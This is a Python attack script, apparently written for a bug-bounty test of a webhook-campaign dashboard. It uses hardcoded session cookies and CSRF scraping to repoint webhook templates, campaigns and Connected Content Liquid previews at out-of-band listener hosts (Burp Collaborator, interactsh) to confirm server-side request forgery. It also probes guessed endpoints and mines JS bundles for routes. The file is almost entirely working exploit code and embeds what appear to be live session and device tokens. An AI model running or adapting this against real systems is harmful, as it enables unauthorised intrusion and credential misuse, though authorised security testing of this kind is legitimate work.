#!/usr/bin/env python3
"""
SSRF Trigger v3 — Proper webhook campaign creation + trigger
Each request gets a fresh CSRF token. Webhook URL is always provided.
"""

import subprocess
import json
import time
import re
import os
import threading
from datetime import datetime, timezone

TARGET = "https://bug-bounty-dashboard.k8s.tools-001.d-use-1.braze-dev.com"
AG = "69c8d257629242005dba8746"
TEMPLATE_ID = "69c8e1c02b6ccb005d77754f"
API_ID = "ee880344-cf11-4c54-b022-7fc0f9689e03"
USER_ID = "69c8d258629242005dba8850"
BURP = "https://ioaotfq5cntio10oir563kvkdbj27svh.oastify.com"

COOKIE = (
    "i18next=en; "
    "sign_in_email=venu17%2B3ytlztjh%40wearehackerone.com; "
    "remember_login_enc_v1=%242%24%2BNEHL07HulteW1IZd8msag%3D%3D%24bmogoUhLR3JXAHPzqTXq%2FLVSBvwxkLmE8HzxeObbktbaT4A0AeovHWx2fHq1%0AxHIp; "
    "_session_id=8395a904b64f05784979cdef1bc47352; "
    "ag_id___69c8d257629242005dba86a5=69c8d257629242005dba8746; "
    "f_ag_id___69c8d257629242005dba86a5=69c8d257629242005dba8746; "
    "authy_remember_device=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaDdDRG9RY21WdFpXMWlaWEpmYldWR09neGxlSEJwY21WelZUb2dRV04wYVhabFUzVndjRzl5ZERvNlZHbHRaVjlwZEdoYWIyNWxXd2hKZFRvSlZHbHRaUTJJangvQVUydVdWZ2s2RFc1aGJtOWZiblZ0YVFKZkFUb05ibUZ1YjE5a1pXNXBCam9OYzNWaWJXbGpjbThpQnpVUU9nbDZiMjVsU1NJSVZWUkRCam9HUlVaSklnaFZWRU1HT3cxVVNYVTdDQTJJangvQVUydVdWZ2s3Q1drQ1h3RTdDbWtHT3dzaUJ6VVFPd3hBQ1RvUlpHVjJaV3h2Y0dWeVgybGtTU0lkTmpsak9HUXlOVGcyTWpreU5ESXdNRFZrWW1FNE9EVXdCanNOVkE9PSIsImV4cCI6IjIwMjYtMDQtMjhUMDg6MjE6NDEuNDIwWiIsInB1ciI6bnVsbH19--8eada447233c614c77d2e44632ec5f5e5e7ee109"
)

interactions = []


def log(msg):
    print(f"[{datetime.now(timezone.utc).strftime('%H:%M:%S')}] {msg}", flush=True)


def curl(method, path, body=None, referer=None, follow=False):
    """Make a curl request and return (status, body, new_csrf)."""
    url = f"{TARGET}{path}"
    cmd = [
        "curl", "-s",
        "-w", "\n__HTTP__%{http_code}",
        "-X", method,
        "-H", f"Cookie: {COOKIE}",
        "-H", "Content-Type: application/json",
        "-H", "Accept: text/html,application/json",
        "-H", "X-Requested-With: XMLHttpRequest",
        "-H", f"Origin: {TARGET}",
        "-H", "Sec-Fetch-Site: same-origin",
        "-H", "Sec-Fetch-Mode: cors",
        "-H", "Sec-Fetch-Dest: empty",
        "-H", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
    ]
    if referer:
        cmd.extend(["-H", f"Referer: {referer}"])
    if follow:
        cmd.append("-L")
    if body:
        cmd.extend(["-d", json.dumps(body) if isinstance(body, dict) else body])
    cmd.append(url)

    result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
    output = result.stdout
    code_match = re.search(r"__HTTP__(\d+)$", output)
    status = int(code_match.group(1)) if code_match else 0
    resp_body = output[:output.rfind("__HTTP__")] if code_match else output
    return status, resp_body


def get_csrf(page_path):
    """Load a page and extract the CSRF token."""
    status, body = curl("GET", page_path, follow=True)
    m = re.search(r'name="csrf-token"\s+content="([^"]+)"', body)
    if m:
        return m.group(1)
    return None


def curl_with_csrf(method, path, body=None, csrf=None, referer=None):
    """Make an authenticated request with a specific CSRF token."""
    url = f"{TARGET}{path}"
    cmd = [
        "curl", "-s",
        "-w", "\n__HTTP__%{http_code}",
        "-X", method,
        "-H", f"Cookie: {COOKIE}",
        "-H", f"X-Csrf-Token: {csrf}",
        "-H", "Content-Type: application/json",
        "-H", "Accept: application/json",
        "-H", "X-Requested-With: XMLHttpRequest",
        "-H", f"Origin: {TARGET}",
        "-H", "Sec-Fetch-Site: same-origin",
        "-H", "Sec-Fetch-Mode: cors",
        "-H", "Sec-Fetch-Dest: empty",
        "-H", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
    ]
    if referer:
        cmd.extend(["-H", f"Referer: {referer}"])
    if body:
        cmd.extend(["-d", json.dumps(body) if isinstance(body, dict) else body])
    cmd.append(url)

    result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
    output = result.stdout
    code_match = re.search(r"__HTTP__(\d+)$", output)
    status = int(code_match.group(1)) if code_match else 0
    resp_body = output[:output.rfind("__HTTP__")] if code_match else output
    return status, resp_body


def start_interactsh():
    gopath = subprocess.check_output(["go", "env", "GOPATH"]).decode().strip()
    client = os.path.join(gopath, "bin", "interactsh-client")
    proc = subprocess.Popen(
        [client, "-v", "-poll-interval", "3", "-json"],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
    )
    domain = None
    deadline = time.time() + 15
    while time.time() < deadline:
        line = proc.stderr.readline()
        m = re.search(r"([a-z0-9]+\.oast\.\w+)", line)
        if m:
            domain = m.group(1)
            break
    return proc, domain


def collect_oob(proc, duration):
    global interactions
    deadline = time.time() + duration
    while time.time() < deadline:
        line = proc.stdout.readline()
        if line.strip():
            try:
                data = json.loads(line.strip())
                interactions.append(data)
                proto = data.get("protocol", "?")
                src = data.get("remote-address", "?")
                log(f"  *** OOB [{proto}] from {src}")
            except json.JSONDecodeError:
                pass
        time.sleep(0.2)


def main():
    log("=" * 70)
    log("SSRF Trigger v3 — Proper Campaign + Webhook Trigger")
    log("=" * 70)

    # Start OOB listener
    log("\nStarting interactsh...")
    iproc, oob = start_interactsh()
    log(f"OOB domain: {oob}")
    oob_collector = threading.Thread(target=collect_oob, args=(iproc, 300), daemon=True)
    oob_collector.start()

    OOB_URL = f"https://trigger.{oob}" if oob else BURP

    # ----------------------------------------------------------------
    # STEP 1: Verify session
    # ----------------------------------------------------------------
    log("\n=== STEP 1: Verify session ===")
    csrf = get_csrf(f"/engagement/templates_and_media/webhook_templates/{AG}/{TEMPLATE_ID}")
    log(f"Session valid, CSRF: {csrf[:30]}...")

    # ----------------------------------------------------------------
    # STEP 2: Update webhook template with BURP URL + interactsh URL
    # ----------------------------------------------------------------
    log("\n=== STEP 2: Update template with Burp Collaborator URL ===")
    status, body = curl_with_csrf(
        "POST",
        f"/engagement/webhook_templates/{TEMPLATE_ID}?app_group_id={AG}",
        body={
            "id": TEMPLATE_ID,
            "name": "test ssrf trigger",
            "description": None,
            "tag_names": [],
            "webhook_body": "{}",
            "webhook_body_type": "json",
            "webhook_method": "POST",
            "territory_ids": [],
            "api_identifier": API_ID,
            "webhook_url": BURP,
            "webhook_headers": {},
        },
        csrf=csrf,
        referer=f"{TARGET}/engagement/templates_and_media/webhook_templates/{AG}/{TEMPLATE_ID}",
    )
    log(f"Template update: {status}")
    log(f"Response: {body[:200]}")

    # ----------------------------------------------------------------
    # STEP 3: Create a new webhook campaign
    # ----------------------------------------------------------------
    log("\n=== STEP 3: Create webhook campaign ===")

    # Get fresh CSRF from campaign creation page
    csrf2 = get_csrf(f"/engagement/campaigns/new?app_group_id={AG}")
    log(f"Campaign page CSRF: {csrf2[:30] if csrf2 else 'FAILED'}...")

    if not csrf2:
        log("Trying alternative page for CSRF...")
        csrf2 = get_csrf(f"/engagement/campaigns?app_group_id={AG}")
        log(f"Alt CSRF: {csrf2[:30] if csrf2 else 'FAILED'}...")

    if csrf2:
        # Create campaign with webhook channel - include the webhook_url
        campaign_body = {
            "name": f"ssrf-webhook-campaign-{int(time.time())}",
            "message_type": "webhook",
            "channel": "webhook",
            "messages": {
                "webhook": {
                    "webhook_url": OOB_URL,
                    "webhook_method": "GET",
                    "webhook_body": "",
                    "webhook_body_type": "json",
                    "webhook_headers": {},
                }
            },
            "webhook_url": OOB_URL,
            "webhook_method": "GET",
            "webhook_body": "",
            "webhook_body_type": "json",
            "webhook_headers": {},
        }

        status, body = curl_with_csrf(
            "POST",
            f"/engagement/campaigns?app_group_id={AG}",
            body=campaign_body,
            csrf=csrf2,
            referer=f"{TARGET}/engagement/campaigns/new?app_group_id={AG}",
        )
        log(f"Campaign create: {status}")
        log(f"Response: {body[:500]}")

        # If we got a campaign ID, try to trigger test send
        campaign_id = None
        try:
            cdata = json.loads(body)
            campaign_id = cdata.get("id") or cdata.get("campaign_id") or cdata.get("campaign", {}).get("id")
            log(f"Campaign ID: {campaign_id}")
        except:
            log("Could not parse campaign response")

        if campaign_id:
            log(f"\n--- Triggering test send for campaign {campaign_id} ---")
            csrf3 = get_csrf(f"/engagement/campaigns/{campaign_id}?app_group_id={AG}")
            if csrf3:
                # Test send the campaign
                for test_path in [
                    f"/engagement/campaigns/{campaign_id}/test_send?app_group_id={AG}",
                    f"/engagement/campaigns/{campaign_id}/test?app_group_id={AG}",
                ]:
                    status, body = curl_with_csrf(
                        "POST", test_path,
                        body={
                            "user_ids": [USER_ID],
                            "webhook_url": OOB_URL,
                            "webhook_method": "GET",
                            "webhook_body": "",
                            "webhook_headers": {},
                        },
                        csrf=csrf3,
                        referer=f"{TARGET}/engagement/campaigns/{campaign_id}?app_group_id={AG}",
                    )
                    log(f"  Test send [{test_path.split('/')[-1].split('?')[0]}]: {status}")
                    log(f"  Response: {body[:300]}")
                    if status == 200:
                        break
                    csrf3 = get_csrf(f"/engagement/campaigns/{campaign_id}?app_group_id={AG}")

    # ----------------------------------------------------------------
    # STEP 4: Try creating campaign via the wizard flow
    # ----------------------------------------------------------------
    log("\n=== STEP 4: Campaign wizard flow ===")
    csrf4 = get_csrf(f"/engagement/campaigns/new?app_group_id={AG}")
    if csrf4:
        # Step 4a: Create campaign draft
        status, body = curl_with_csrf(
            "POST",
            f"/engagement/campaigns?app_group_id={AG}",
            body={
                "name": f"ssrf-test-{int(time.time())}",
                "draft": True,
                "channels": ["webhook"],
            },
            csrf=csrf4,
            referer=f"{TARGET}/engagement/campaigns/new?app_group_id={AG}",
        )
        log(f"Draft campaign: {status}")
        log(f"Response: {body[:500]}")

        cid2 = None
        try:
            d = json.loads(body)
            cid2 = d.get("id") or d.get("campaign", {}).get("id")
        except:
            pass

        if cid2:
            log(f"Draft campaign ID: {cid2}")
            # Step 4b: Update with webhook config
            csrf5 = get_csrf(f"/engagement/campaigns/{cid2}/edit?app_group_id={AG}")
            if csrf5:
                status, body = curl_with_csrf(
                    "PUT",
                    f"/engagement/campaigns/{cid2}?app_group_id={AG}",
                    body={
                        "webhook_url": OOB_URL,
                        "webhook_method": "GET",
                        "webhook_body": "",
                        "webhook_body_type": "json",
                        "webhook_headers": {},
                    },
                    csrf=csrf5,
                    referer=f"{TARGET}/engagement/campaigns/{cid2}/edit?app_group_id={AG}",
                )
                log(f"Update campaign: {status}")
                log(f"Response: {body[:300]}")

                # Step 4c: Test send
                csrf6 = get_csrf(f"/engagement/campaigns/{cid2}/edit?app_group_id={AG}")
                if csrf6:
                    status, body = curl_with_csrf(
                        "POST",
                        f"/engagement/campaigns/{cid2}/test_send?app_group_id={AG}",
                        body={
                            "user_ids": [USER_ID],
                            "webhook_url": OOB_URL,
                        },
                        csrf=csrf6,
                        referer=f"{TARGET}/engagement/campaigns/{cid2}/edit?app_group_id={AG}",
                    )
                    log(f"Test send: {status}")
                    log(f"Response: {body[:300]}")

    # ----------------------------------------------------------------
    # STEP 5: Try Connected Content preview (renders Liquid server-side)
    # ----------------------------------------------------------------
    log("\n=== STEP 5: Connected Content via Liquid preview ===")
    csrf7 = get_csrf(f"/engagement/campaigns/new?app_group_id={AG}")
    if csrf7:
        liquid_body = f'{{% connected_content {OOB_URL} %}}'
        preview_endpoints = [
            f"/engagement/preview_template?app_group_id={AG}",
            f"/engagement/templates/preview?app_group_id={AG}",
            f"/engagement/liquid_preview?app_group_id={AG}",
            f"/engagement/message_preview?app_group_id={AG}",
            f"/messaging/preview?app_group_id={AG}",
        ]
        for ep in preview_endpoints:
            status, body = curl_with_csrf(
                "POST", ep,
                body={
                    "message": liquid_body,
                    "template": liquid_body,
                    "body": liquid_body,
                    "content": liquid_body,
                    "text": liquid_body,
                    "webhook_url": OOB_URL,
                },
                csrf=csrf7,
                referer=f"{TARGET}/engagement/campaigns/new?app_group_id={AG}",
            )
            log(f"  Preview [{ep}]: {status} — {body[:150]}")
            if status == 200:
                break
            csrf7 = get_csrf(f"/engagement/campaigns/new?app_group_id={AG}")

    # ----------------------------------------------------------------
    # STEP 6: Enumerate campaign-related endpoints from the page source
    # ----------------------------------------------------------------
    log("\n=== STEP 6: Enumerate endpoints from page source ===")
    status, page_html = curl("GET", f"/engagement/campaigns/new?app_group_id={AG}", follow=True)
    # Look for API routes in the JavaScript
    routes = set()
    for m in re.finditer(r'["\'](/(?:engagement|api|messaging)[^"\']*(?:test|send|preview|webhook|connected)[^"\']*)["\']', page_html):
        routes.add(m.group(1))
    for m in re.finditer(r'["\']([^"\']*(?:test_send|send_test|preview|webhook_test)[^"\']*)["\']', page_html):
        routes.add(m.group(1))

    if routes:
        log(f"Found {len(routes)} endpoint patterns in page JS:")
        for r in sorted(routes):
            log(f"  {r}")
    else:
        log("No endpoint patterns found in page source, checking JS bundles...")
        js_urls = re.findall(r'src="(/assets/[^"]+\.js)"', page_html)
        log(f"Found {len(js_urls)} JS bundles")
        for js_url in js_urls[:3]:
            status, js_body = curl("GET", js_url, follow=True)
            webhook_routes = set()
            for m in re.finditer(r'["\']([^"\']*(?:test_send|send_test|webhook.*test|preview)[^"\']{0,60})["\']', js_body):
                val = m.group(1)
                if '/' in val and len(val) < 100:
                    webhook_routes.add(val)
            if webhook_routes:
                log(f"  JS bundle {js_url}:")
                for wr in sorted(webhook_routes):
                    log(f"    {wr}")

    # ----------------------------------------------------------------
    # STEP 7: Wait for OOB and report
    # ----------------------------------------------------------------
    log("\n=== STEP 7: Final OOB wait (45s) ===")
    time.sleep(45)

    log(f"\n{'='*70}")
    if interactions:
        log(f"*** SSRF CONFIRMED — {len(interactions)} OOB interaction(s) ***")
        for i, x in enumerate(interactions, 1):
            log(f"\nInteraction {i}: {json.dumps(x, indent=2)[:1000]}")
    else:
        log("No OOB interactions in automated window.")
        log("Templates are stored with SSRF payloads — trigger via dashboard UI required.")
    log("=" * 70)

    with open("/workspace/ssrf_trigger_v3_results.json", "w") as f:
        json.dump({
            "oob_domain": oob,
            "burp_collab": BURP,
            "interactions": interactions,
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }, f, indent=2)

    if iproc:
        iproc.terminate()


if __name__ == "__main__":
    main()
